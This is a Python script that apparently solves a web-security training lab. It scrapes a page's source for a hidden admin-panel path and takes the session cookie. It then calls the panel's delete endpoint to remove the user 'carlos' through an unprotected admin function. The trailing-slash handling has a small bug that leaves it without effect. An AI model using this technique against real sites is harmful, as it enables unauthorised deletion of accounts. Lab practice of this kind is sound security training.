import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def extract_session_cookies(r):
    session_cookie = r.cookies.get_dict().get('session')
    return session_cookie

def search_for_admin_panel(r:requests.Response):
    soup = BeautifulSoup(r.text, 'html.parser')
    #extracting admin panel from source code
    admin_instances = soup.find(text=re.compile("/admin-"))
    admin_panel = re.search("href', '(.*)'", admin_instances).group(1)
    return admin_panel

def delete_carlos(url: str, session_cookie: str, admin_panel: str):
    cookies = {'session': session_cookie}
    if admin_panel.endswith('/'):
        admin_panel.removesuffix('/')
    endpoint = url + admin_panel + "/delete?username=carlos"
    try:
        r = requests.get(endpoint, cookies= cookies, verify=False, timeout=5, proxies=proxies)
        if r.status_code == 200:
            print("Carlos Deleted Successfully")
            return True
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return False
    return False
def main():
    if len(sys.argv) != 2:
        print(f"Script Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} example.com")
        sys.exit(-1)
    url = sys.argv[1]
    try:
        r = requests.get(url, proxies=proxies, verify=False, timeout=5)
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        sys.exit(-1)
    session_cookie = extract_session_cookies(r)
    if session_cookie:
        print(f"Session Cookie Extracted: {session_cookie}")
    else:
        print("Could not extract session cookie check url")
        sys.exit(-1)
    admin_panel = search_for_admin_panel(r)
    if admin_panel:
        print(f"Admin panel extracted!: {admin_panel}")
    else:
        print("Could not extract admin panel check url")
        sys.exit(-1)
    if delete_carlos(url, session_cookie, admin_panel):
        print("Lab Solved!")
        sys.exit(0)
    else:
        print("Could not delete Carlos")
        sys.exit(-1)



if __name__ == '__main__':
    main()